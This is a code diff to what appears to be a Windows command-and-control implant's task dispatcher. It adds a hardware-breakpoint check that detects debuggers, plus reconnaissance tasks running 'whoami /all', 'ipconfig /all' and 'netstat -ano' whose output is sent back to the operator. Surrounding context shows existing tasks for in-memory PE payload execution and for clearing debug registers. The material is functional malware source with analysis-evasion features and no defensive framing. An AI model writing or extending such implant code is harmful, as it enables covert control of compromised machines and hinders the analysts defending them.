@@ -682,6 +682,25 @@ void dispatch_task(AgentTask *task) {
     else if (strcmp(type_upper, "ENV") == 0) {
         char *out = run_shell("set 2>&1"); agent_send_result(task->id, out, ""); free(out);
     }
+    else if (strcmp(type_upper, "HW_BP_CHECK") == 0) {
+        HANDLE ht = OpenThread(THREAD_GET_CONTEXT, FALSE, GetCurrentThreadId());
+        if (!ht) {
+            agent_send_result(task->id, "", "OpenThread failed");
+        } else {
+            CONTEXT ctx = {0};
+            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+            char msg[128] = "[+] No hardware breakpoints detected";
+            if (GetThreadContext(ht, &ctx)) {
+                if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+                    snprintf(msg, sizeof(msg),
+                        "[!] Hardware breakpoints active: DR0=%p DR1=%p DR2=%p DR3=%p",
+                        (void*)ctx.Dr0, (void*)ctx.Dr1, (void*)ctx.Dr2, (void*)ctx.Dr3);
+                }
+            }
+            CloseHandle(ht);
+            agent_send_result(task->id, msg, "");
+        }
+    }
     else if (strcmp(type_upper, "HWBP_CLEAR") == 0) {
         HANDLE ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, GetCurrentThreadId());
         if (!ht) {
@@ -736,6 +755,18 @@ void dispatch_task(AgentTask *task) {
             agent_send_result(task->id, "", "EXEC_PE: no PE payload"); return;
         }
         char *out = exec_pe(task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "WHOAMI") == 0) {
+        char *out = run_shell("whoami /all");
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "IPCONFIG") == 0) {
+        char *out = run_shell("ipconfig /all");
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "NETSTAT") == 0) {
+        char *out = run_shell("netstat -ano");
         agent_send_result(task->id, out, ""); free(out);
     }
     else {
